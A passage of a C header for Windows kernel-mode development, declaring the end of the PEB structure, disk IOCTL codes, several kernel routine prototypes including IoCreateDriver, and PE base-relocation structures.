	KAFFINITY			AffinityMask;						// C0
	ULONG				GdiHandleBuffer[0x22];				// C4
	ULONG				PostProcessInitRoutine;				// 14C
	ULONG				TlsExpansionBitmap;					// 150
	UCHAR				TlsExpansionBitmapBits[0x80];		// 154
	ULONG				SessionId;							// 1D4
	ULARGE_INTEGER		AppCompatFlags;						// 1D8
	PULONG				CSDVersion;							// 1E0
/*	PVOID				AppCompatInfo;						// 1E4
	UNICODE_STRING		usCSDVersion;
	PVOID				ActivationContextData;
    PVOID				ProcessAssemblyStorageMap;
    PVOID				SystemDefaultActivationContextData;
    PVOID				SystemAssemblyStorageMap;
    ULONG				MinimumStackCommit; */
} PEB, *PPEB;



// --- Disk access structures and routines --------------------------------------------------------------------------------------


//
// IoControlCode values for disk devices.
//

#define IOCTL_DISK_BASE                 FILE_DEVICE_DISK
#define IOCTL_DISK_GET_DRIVE_GEOMETRY   CTL_CODE(IOCTL_DISK_BASE, 0x0000, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DISK_GET_PARTITION_INFO   CTL_CODE(IOCTL_DISK_BASE, 0x0001, METHOD_BUFFERED, FILE_READ_ACCESS)
#define IOCTL_DISK_SET_PARTITION_INFO   CTL_CODE(IOCTL_DISK_BASE, 0x0002, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_DISK_GET_DRIVE_LAYOUT     CTL_CODE(IOCTL_DISK_BASE, 0x0003, METHOD_BUFFERED, FILE_READ_ACCESS)
#define IOCTL_DISK_SET_DRIVE_LAYOUT     CTL_CODE(IOCTL_DISK_BASE, 0x0004, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_DISK_VERIFY               CTL_CODE(IOCTL_DISK_BASE, 0x0005, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DISK_FORMAT_TRACKS        CTL_CODE(IOCTL_DISK_BASE, 0x0006, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_DISK_REASSIGN_BLOCKS      CTL_CODE(IOCTL_DISK_BASE, 0x0007, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_DISK_PERFORMANCE          CTL_CODE(IOCTL_DISK_BASE, 0x0008, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DISK_IS_WRITABLE          CTL_CODE(IOCTL_DISK_BASE, 0x0009, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DISK_LOGGING              CTL_CODE(IOCTL_DISK_BASE, 0x000a, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DISK_FORMAT_TRACKS_EX     CTL_CODE(IOCTL_DISK_BASE, 0x000b, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#define IOCTL_DISK_HISTOGRAM_STRUCTURE  CTL_CODE(IOCTL_DISK_BASE, 0x000c, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DISK_HISTOGRAM_DATA       CTL_CODE(IOCTL_DISK_BASE, 0x000d, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DISK_HISTOGRAM_RESET      CTL_CODE(IOCTL_DISK_BASE, 0x000e, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DISK_REQUEST_STRUCTURE    CTL_CODE(IOCTL_DISK_BASE, 0x000f, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DISK_REQUEST_DATA         CTL_CODE(IOCTL_DISK_BASE, 0x0010, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DISK_PERFORMANCE_OFF      CTL_CODE(IOCTL_DISK_BASE, 0x0018, METHOD_BUFFERED, FILE_ANY_ACCESS)



__declspec(dllimport)
NTSTATUS ZwDeviceIoControlFile(
  __in       HANDLE FileHandle,
  __in_opt   HANDLE Event,
  __in_opt   PIO_APC_ROUTINE ApcRoutine,
  __in_opt   PVOID ApcContext,
  __out      PIO_STATUS_BLOCK IoStatusBlock,
  __in       ULONG IoControlCode,
  __in_opt   PVOID InputBuffer,
  __in       ULONG InputBufferLength,
  __out_opt  PVOID OutputBuffer,
  __in       ULONG OutputBufferLength
);


__declspec(dllimport)
NTSTATUS
  ObReferenceObjectByName(
    IN PUNICODE_STRING  ObjectName,
    IN ULONG            Attributes,
    IN PACCESS_STATE    PassedAccessState OPTIONAL,
    IN ACCESS_MASK      DesiredAccess OPTIONAL,
    IN POBJECT_TYPE     ObjectType,
    IN KPROCESSOR_MODE  AccessMode,
    IN OUT PVOID        ParseContext OPTIONAL,
    OUT PVOID           *Object
    );


extern POBJECT_TYPE *IoDeviceObjectType;
extern POBJECT_TYPE *IoDriverObjectType;



typedef struct _IO_QUERY_DIRECTORY
{
	ULONG			Length;
	PUNICODE_STRING FileName;
	FILE_INFORMATION_CLASS FileInformationClass;
	ULONG			FileIndex;
} IO_QUERY_DIRECTORY, *PIO_QUERY_DIRECTORY;


//
// Based relocation types.
//

typedef struct _IMAGE_BASE_RELOCATION_EX {
    DWORD   VirtualAddress;
    DWORD   SizeOfBlock;
	WORD    TypeOffset[0];
} IMAGE_BASE_RELOCATION_EX, *PIMAGE_BASE_RELOCATION_EX;

#define IMAGE_SIZEOF_BASE_RELOCATION         8

#define	IMAGE_REL_BASED_MASK				0x0fff
#define	IMAGE_REL_BASED_SHIFT				12


__declspec(dllimport)
NTSTATUS
IoCreateDriver(
    IN PUNICODE_STRING DriverName    OPTIONAL,
    IN PDRIVER_INITIALIZE InitializationFunction
    );